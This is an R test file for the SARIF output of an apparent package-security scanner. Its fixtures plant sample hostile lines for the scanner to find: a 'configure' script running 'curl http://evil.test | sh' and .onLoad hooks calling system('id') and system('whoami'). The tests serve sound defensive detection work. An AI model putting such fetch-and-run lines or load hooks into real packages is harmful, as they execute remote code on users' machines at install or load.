# emit_sarif() renders a scan for any SARIF consumer. The document is a
# contract, so most of these tests are about the parts a consumer relies on:
# stable ids, stable fingerprints, and a level that means what it says.

rules <- load_rules()

skip_without_jsonlite <- function() skip_if_not_installed("jsonlite")

sarif_of <- function(x) {
  skip_without_jsonlite()
  jsonlite::fromJSON(emit_sarif(x), simplifyVector = FALSE)
}

# A package with a finding of each kind: a reported file context, a pattern in
# a hook, a pattern that runs at no phase, and a match in a shell script.
sarif_pkg <- function() {
  make_pkg(files = list(
    "R/zzz.R"   = c(".onLoad <- function(l, p) system('id')",
                    "f <- function() source('x.R')"),
    "configure" = "curl http://evil.test | sh"
  ))
}

test_that("the document is SARIF 2.1.0 with one run", {
  doc <- sarif_of(audit_package(sarif_pkg(), rules))

  expect_equal(doc$version, "2.1.0")
  expect_match(doc$`$schema`, "sarif-2\\.1\\.0")
  expect_length(doc$runs, 1L)
  expect_equal(doc$runs[[1L]]$tool$driver$name, "pkgaudit")
  expect_true(doc$runs[[1L]]$invocations[[1L]]$executionSuccessful)
})

test_that("rule ids are namespaced by the kind of rule", {
  # `curl` names both a pattern rule and a match rule. Unnamespaced, a consumer
  # would silently merge them into one rule.
  pkg <- make_pkg(files = list(
    "R/zzz.R"   = "f <- function() curl::curl_fetch_memory('http://x')",
    "configure" = "curl http://evil.test"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  ids <- vapply(sarif_of(audit_package(pkg, rules))$runs[[1L]]$results,
                function(r) r$ruleId, character(1L))
  expect_true("pattern/curl" %in% ids)
  expect_true("match/curl"   %in% ids)
})

test_that("level says whether the code runs on its own, not how bad it is", {
  pkg <- sarif_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  results <- sarif_of(audit_package(pkg, rules))$runs[[1L]]$results

  by_level <- vapply(results, function(r) {
    paste(r$ruleId, r$level, length(r$properties$phases) > 0L)
  }, character(1L))

  # The hook's system() runs at load; the source() in an ordinary function runs
  # only if something calls it.
  expect_true(any(grepl("^pattern/system warning TRUE$", by_level)))
  expect_true(any(grepl("^pattern/source note FALSE$", by_level)))
})

test_that("a file context is a note however many phases it runs in", {
  # It is not a claim about code -- it says a file exists and will execute --
  # and most packages that build native code have one, so alerting on its
  # presence is inventory. The note still means pkgaudit could only grep it.
  pkg <- sarif_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  results <- sarif_of(audit_package(pkg, rules))$runs[[1L]]$results

  fc <- Filter(function(r) startsWith(r$ruleId, "file/"), results)
  expect_gt(length(fc), 0L)
  expect_true(all(vapply(fc, function(r) r$level, character(1L)) == "note"))
  # ... even though configure runs at build, check and install.
  expect_gt(length(fc[[1L]]$properties$phases), 0L)
})

test_that("a fingerprint survives a line-number shift", {
  hook <- c(".onLoad <- function(l, p) system('id')")
  a <- make_pkg(files = list("R/zzz.R" = hook))
  b <- make_pkg(files = list("R/zzz.R" = c("# a comment added above", "", hook)))
  on.exit(unlink(c(a, b), recursive = TRUE), add = TRUE)

  fp <- function(pkg) {
    r <- sarif_of(audit_package(pkg, rules))$runs[[1L]]$results
    vapply(r, function(x) x$partialFingerprints$pkgauditFindingV1, character(1L))
  }
  # The line moved, so an alert keyed on position would be retired and reopened
  # by a change that touched nothing.
  expect_equal(fp(a), fp(b))
})

test_that("no two results in a run share a fingerprint", {
  # A consumer uses partialFingerprints to match an alert across runs, so a
  # fingerprint repeated within one run makes several findings read as one.
  # Rule, file and context alone are not enough: a package can call system()
  # twice on different lines of the same hook.
  pkg <- make_pkg(files = list("R/zzz.R" = c(
    ".onLoad <- function(l, p) {",
    "  system('id')",
    "  system('whoami')",
    "  system('id')",
    "}"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  results <- sarif_of(audit_package(pkg, rules))$runs[[1L]]$results
  fp <- vapply(results, function(r) r$partialFingerprints$pkgauditFindingV1,
               character(1L))
  expect_length(fp, 3L)
  expect_length(unique(fp), 3L)
})

test_that("a finding that moves to another file gets another fingerprint", {
  a <- make_pkg(files = list("R/zzz.R" = ".onLoad <- function(l,p) system('id')"))
  b <- make_pkg(files = list("R/aaa.R" = ".onLoad <- function(l,p) system('id')"))
  on.exit(unlink(c(a, b), recursive = TRUE), add = TRUE)

  fp <- function(pkg) {
    r <- sarif_of(audit_package(pkg, rules))$runs[[1L]]$results
    vapply(r, function(x) x$partialFingerprints$pkgauditFindingV1, character(1L))
  }
  expect_false(identical(fp(a), fp(b)))
})

test_that("a descriptor is written for every rule that fired, and no other", {
  pkg <- sarif_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  run <- sarif_of(audit_package(pkg, rules))$runs[[1L]]

  described <- vapply(run$tool$driver$rules, function(d) d$id, character(1L))
  fired     <- unique(vapply(run$results, function(r) r$ruleId, character(1L)))
  expect_setequal(described, fired)

  # A file-context rule carries no ATT&CK technique; its tags must be empty
  # rather than a null.
  fc <- Filter(function(d) d$id == "file/configure", run$tool$driver$rules)[[1L]]
  expect_equal(fc$properties$tags, list())
})

test_that("locations are relative and carry no local path", {
  pkg <- sarif_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  doc <- emit_sarif(audit_package(pkg, rules))

  expect_false(grepl(pkg, doc, fixed = TRUE))
  uris <- vapply(sarif_of(audit_package(pkg, rules))$runs[[1L]]$results,
                 function(r) r$locations[[1L]]$physicalLocation$artifactLocation$uri,
                 character(1L))
  expect_true(all(!startsWith(uris, "/")))
})

test_that("coverage becomes artifacts, so what was not read is in the document", {
  pkg <- make_pkg(files = list("R/f.R" = "f <- function() 1",
                               "src/hi.c" = "void hi(void) { }"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  arts <- sarif_of(audit_package(pkg, rules))$runs[[1L]]$artifacts
  by_uri <- vapply(arts, function(a) a$location$uri, character(1L))
  hi <- arts[[which(by_uri == "src/hi.c")]]

  expect_equal(hi$properties$status, "exportable")
  expect_equal(hi$properties$language, "c")
})

test_that("errors become notifications and do not fail the run", {
  pkg <- make_pkg(files = list("R/bad.R" = "f <- function( {"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  inv <- sarif_of(audit_package(pkg, rules))$runs[[1L]]$invocations[[1L]]
  # Lost coverage is not a failed run.
  expect_true(inv$executionSuccessful)
  expect_gt(length(inv$toolExecutionNotifications), 0L)
  expect_equal(inv$toolExecutionNotifications[[1L]]$descriptor$id, "parse_code")
})

test_that("a package with no findings still renders a valid document", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  run <- sarif_of(audit_package(pkg, rules))$runs[[1L]]

  expect_equal(run$results, list())
  expect_equal(run$tool$driver$rules, list())
})

test_that("the same scan renders the same document", {
  pkg <- sarif_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  res <- audit_package(pkg, rules)
  expect_identical(emit_sarif(res), emit_sarif(res))
})

# The shape of the document, as the sorted set of key paths it contains, with
# "[]" marking an array. Values are deliberately excluded: what the tests above
# cannot catch is a field silently appearing or disappearing, and a snapshot of
# values churns whenever a rule message or a fingerprint changes, which trains a
# reader to accept the diff without looking at it.
sarif_shape <- function(x, prefix = "") {
  if (!is.list(x)) return(prefix)
  if (length(x) == 0L) return(paste0(prefix, "[]"))
  if (is.null(names(x))) {
    return(unique(unlist(lapply(x, sarif_shape, prefix = paste0(prefix, "[]")))))
  }
  unique(unlist(lapply(names(x), function(n) {
    sarif_shape(x[[n]], paste0(prefix, if (nzchar(prefix)) "." else "", n))
  })))
}

test_that("the document has the shape a consumer is promised", {
  # A package carrying one of everything: a reported file context, a pattern in
  # a hook and one in a function, a match, a file that will not parse, and a
  # compiled source -- so every optional field appears somewhere.
  pkg <- make_pkg(files = list(
    "R/zzz.R"   = c(".onLoad <- function(l, p) system('id')",
                    "f <- function() source('x.R')"),
    "R/bad.R"   = "g <- function( {",
    "configure" = "curl http://evil.test | sh",
    "src/hi.c"  = "void hi(void) { }"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  shape <- sort(sarif_shape(sarif_of(audit_package(pkg, rules))))
  expect_snapshot(cat(shape, sep = "\n"))
})

test_that("emit_sarif() says what to install when jsonlite is absent", {
  local_mocked_bindings(.have_jsonlite = function() FALSE)
  expect_error(emit_sarif(make_obj()), "needs the jsonlite package")
})

test_that("a scan with nothing in it yields no fingerprints, artifacts or notes", {
  expect_equal(.sarif_fingerprints(.empty_patterns()), character(0L))
  expect_equal(.sarif_artifacts(.empty_coverage()), list())
  expect_equal(.sarif_artifacts(NULL), list())
  expect_equal(.sarif_notifications(.empty_errors()), list())
  expect_equal(.sarif_notifications(NULL), list())
})

test_that("an error naming a rule carries it onto the notification", {
  errors <- .empty_errors()
  errors[1L, ] <- list("find_patterns", "R/f.R", "system", "boom")

  note <- .sarif_notifications(errors)[[1L]]
  expect_equal(note$associatedRule$id, "system")
  expect_equal(note$descriptor$id, "find_patterns")
  expect_equal(
    note$locations[[1L]]$physicalLocation$artifactLocation$uri, "R/f.R"
  )
})
